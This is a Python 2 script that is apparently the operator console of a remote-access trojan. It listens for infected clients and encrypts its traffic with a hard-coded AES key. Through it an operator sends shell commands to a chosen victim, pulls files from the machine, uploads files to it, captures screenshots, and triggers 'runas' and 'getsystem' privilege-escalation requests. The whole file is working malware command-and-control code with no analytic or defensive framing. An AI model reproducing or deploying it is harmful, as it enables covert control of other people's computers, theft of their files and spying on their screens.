#!/usr/bin/env python
 
import socket, time, os, sys, urllib, base64, subprocess as sp
from PIL import ImageGrab
from PIL import ImageOps
import PIL
import numpy as np
import cv2
from Crypto.Cipher import AES
 
serversock = socket.socket()
serversock.settimeout(1)
serversock.bind(("0.0.0.0",80))
serversock.listen(25)
 
marker = chr(1)+chr(1)
 
aesobj = AES.new('brvty5b6BB7y56b754BBERBT', AES.MODE_CFB, 'odiryvt93y489yrv')
                                                        #Cryptography stuff
EncodeAES = lambda  s: base64.b64encode(aesobj.encrypt(s))
DecodeAES = lambda  e: aesobj.decrypt(base64.b64decode(e))
 
def Send(sock, data):
    if not data:
        data = " "
    sock.sendall(EncodeAES(data+marker))
     
def Recv(sock):
    data = ""
    while True:
        data += DecodeAES(sock.recv(512))
        if not data: break
        elif data.endswith(marker): break
    if not data:
        sock = None
        return sock
    return data[:-2]
     
def Download(sock, rfile, lfile=None):
    if not lfile:
        lfile = rfile
    with open(lfile,"wb") as f:
        #Set timeout so in case of errors the script doesn't freeze.
        sock.settimeout(30)
        #Send command to download a file.
        Send(sock, "download "+rfile)
        #Get the size.
        while True:
            line = sock.recv(4096)
            if marker in line: break
            f.write(line)
            f.flush()
        print("\nDownload complete")
        f.close() #Download complete! We can close the file and return.
        sock.settimeout(None)
        return
         
def Upload(sock, file): #Function to download files
        Send(sock, "upload "+file)
        print(file)
        file = os.path.join(os.getcwd(),file) #Get full file path
        print(file)
        try:
            with open(file,"rb") as f:
                print(file) #Print file name for debugging purposes.
                while True:
                    line = f.readline()
                    if not line: break #Read and send file line by line.
                    sock.sendall(line)
                time.sleep(1) #When done, send marker.
                sock.send(marker)
                f.close()
                print("Upload complete")
                sock.settimeout(None) #Reset socket timeout
                return
        except Exception as e: #In case of exception, print it and return.
            print("failed with "+str(e))
            sock.send("Invalid file")
            sock.send(marker)
             
def Upload_N(sock, file): #Function to download files
        file = os.path.join(os.getcwd(),file) #Get full file path
        try:
            with open(file,"rb") as f:
                while True:
                    line = f.readline()
                    if not line: break #Read and send file line by line.
                    sock.sendall(line)
                time.sleep(1) #When done, send marker.
                sock.send(marker)
                f.close()
                sock.settimeout(None) #Reset socket timeout
                return
        except Exception as e: #In case of exception, print it and return.
            print("failed with "+str(e))
            sock.send("Invalid file")
            sock.send(marker)
 
def RefreshClients(clients):
    try:
        os.system("cls")
        print("Listening for clients...")
        print("*-----*")
        if not clients:
            print(" ")
        else:
            for i, sock in enumerate(clients):
                print("["+str(i+1)+"]: "+str(clients[i][0])+":"+str(clients[i][1]))
        print("*-----*")
        print("Press Ctrl-C to select sock.")
    except KeyboardInterrupt:
        return
     
def ListenForClients(sock):
    sock.settimeout(1)
    clientsocks = []
    clientaddrs = []
    while True:
        RefreshClients(clientaddrs)
        try:
            try:
                s, a = sock.accept()
                clientsocks.append(s)
                clientaddrs.append(a)
            except socket.timeout:
                continue
        except KeyboardInterrupt:
            os.system("cls")
            print("*-----*")
            for i, sock in enumerate(clientaddrs):
                print("["+str(i+1)+"]: "+str(clientaddrs[i][0])+":"+str(clientaddrs[i][1]))
            print(" \n[0]: Exit")
            print("*-----*")
            selected = raw_input("[?]Input number of selected sock: ")
            if selected == "0":
                exit()
            s = clientsocks[int(selected)-1]
            a = clientaddrs[int(selected)-1][0]
            clientsocks = []
            clientaddrs = []
            return s, a
             
def ReconnectWithRestartedClient(serversock, addr):
    try:
        serversock.settimeout(60)
        while True:
            s, a = serversock.accept()
            if a[0] == addr:
                s.setblocking(True)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
                s.settimeout(10)
                output = Recv(s)[16:]
                sys.stdout.write(output)
                sys.stdout.flush()
                return s
            else: s.close()
    except socket.error as e:
        print e
        return False
    except socket.timeout as e:
        print e
        return False
    except Exception as e:
        print e
        return False
         
def Screenshot(sock):
    data = ""
    while True:
        data += sock.recv(4096)
        print len(data)
        if len(data) > 4200000: print data[-32:]
        if data.endswith(r"lelmao"): break
 
    data, size = data.split("]|[]|[")
    size = size[:-6]
    size = tuple([int(i) for i in size.split()])
 
    img = PIL.Image.frombuffer("RGB", size, data)
    img = ImageOps.mirror(img)
    img = img.rotate(180)
    frame = np.array(img)
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    cv2.imshow("test", frame)
    cv2.waitKey()
     
         
while True:
    sock, addr = ListenForClients(serversock)
    sock.setblocking(True)
    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, True)
    sock.settimeout(60)
    try:
        output = Recv(sock)[16:]
        sys.stdout.write(output)
        sys.stdout.flush()
    except Exception as e:
        print e
        sys.stdout.write("shell>")
        sys.stdout.flush()
    while sock:
        try:
            input = raw_input()
            if input == "exit":
                sock = None
                continue
            elif input == "runas":
                Send(sock, "runas")
                print("runasing, exiting")
                time.sleep(1)
                sock = None
                continue
            elif input.startswith("download"):
                input = input.split()
                if len(input) == 2:
                    Download(sock, input[1])
                elif len(input) == 3:
                    Download(sock, input[1], input[2])
                Send(sock, "cd .")
            elif input.startswith("upload"):
                input = input.split()
                Upload(sock, input[1])
                Send(sock, "cd .")
            elif input.startswith("screenshot"):
                Send(sock, "screenshot")
                Screenshot(sock)
            else:
                Send(sock, input)
             
            while True:
                output = Recv(sock)
                if not output:
                    sock = None
                    break
                if output.startswith("GETSYSTEM"):
                    Send(sock, "getsystem")
                    output = Recv(sock)
                if output.startswith(chr(2)+chr(2)):
                    output = output[2:]
                    if output.startswith("NEWCONN"):
                        newsock = ReconnectWithRestartedClient(serversock, addr)
                        if newsock: 
                            sock.sendall(chr(1))
                            sock = newsock
                        else:
                            sock.sendall(chr(2))
                            output = Recv(sock)
                            if output.endswith("NEWCONN"): output = output[:-7]
                            sys.stdout.write(output)
                            sys.stdout.flush()
                    else:
                        print output
                        continue
                if output.endswith("NEWCONN"): output = output[:-7]
                sys.stdout.write(output)
                sys.stdout.flush()
                break
        except KeyboardInterrupt:
            sock.close()
            sock = None
        except Exception as e:
            print e
            serversock.settimeout(15)
            print "[!]An error occured. Attempting to reconnect, please wait..."
            sock = ReconnectWithRestartedClient(serversock, addr)
            serversock.settimeout(None)
            continue
    print("bye")